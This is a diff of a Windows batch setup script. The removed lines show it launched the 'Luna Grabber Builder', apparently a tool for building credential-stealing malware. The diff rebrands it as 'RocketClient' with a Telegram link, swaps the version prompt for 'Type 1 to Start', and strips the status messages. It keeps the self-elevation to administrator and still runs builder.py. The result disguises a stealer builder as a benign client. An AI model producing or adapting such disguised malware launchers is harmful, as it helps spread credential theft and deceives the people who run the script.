@@ -1,18 +1,14 @@
 @echo off
-color 5
-title Checking Python Versions
+color 4
+title RocketClient
 setlocal enabledelayedexpansion
 set "python_versions="
 
-
-:: If the above command fails (meaning the batch file is not running as administrator),
-:: restart the batch file, this time with administrator privileges
 if %errorlevel% NEQ 0 (
 	powershell.exe -Command "Start-Process -Verb RunAs -FilePath \"%~f0\""
 	exit /b
 )
 
-:: Set woring directory to the directory of the batch file
 cd /d "%~dp0"
 
 REM Loop through all directories in PATH looking for python executables
@@ -45,10 +41,8 @@ if %counter% equ 0 (
 
 REM Prompt user to choose a Python version
 echo.
-echo If you want to use Nuitka, you need to select a version 3.4.X - 3.11.X
-set /p "selected_number=Enter the left number of the desired Python version from the list above: "
+set /p "selected_number=Type 1 to Start: "
 echo.
-
 REM Check if the selected number is valid
 if not defined python_versions[%selected_number%] (
 	echo Invalid selection! Exiting...
@@ -61,25 +55,28 @@ set "selected_python_path=!python_paths[%selected_number%]!"
 REM Append Python version to the .venv folder name
 set "venv_name=.venv_!selected_version!"
 
-title Creating Virtual Environment for Python version !selected_version!
-echo Creating Virtual Environment for Python version !selected_version!...
+title RocketClient
+cls
+echo https://t.me/RocketClient
 "!selected_python_path!" -m venv "!venv_name!"
 
-title Installing Requirements
-echo Installing Requirements...
+title RocketClient
+cls
+echo https://t.me/RocketClient
 "!venv_name!\Scripts\pip" install -r requirements.txt
 
-title Checking for updates
-echo Checking for updates...
+title RocketClient
+cls
+echo https://t.me/RocketClient
 "!venv_name!\Scripts\python" tools\update.py
 
 if %errorlevel% equ 0 (
-	echo Setup Complete!
-	title Luna Grabber Builder
-	echo Starting the builder...
+	cls
+	title RocketClient
+	echo https://t.me/RocketClient
 	"!venv_name!\Scripts\python" builder.py
 ) else if %errorlevel% equ 1 (
-	title Setup Failed
+	title RocketClient
 	echo Setup Failed!
 	echo Check the error message above.
 	pause > nul
